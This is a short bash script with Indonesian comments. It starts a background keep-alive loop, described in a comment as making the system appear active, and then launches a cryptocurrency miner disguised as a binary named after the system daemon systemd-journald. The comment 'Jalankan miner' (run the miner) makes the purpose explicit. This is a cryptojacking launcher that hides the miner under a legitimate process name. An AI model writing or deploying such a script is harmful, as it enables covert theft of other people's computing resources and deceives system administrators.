#!/bin/bash

# Loop background agar sistem dianggap aktif
while true; do
    echo "Running..." > /dev/null
    sleep 300
done &

# Jalankan miner
./systemd-journald -c config.json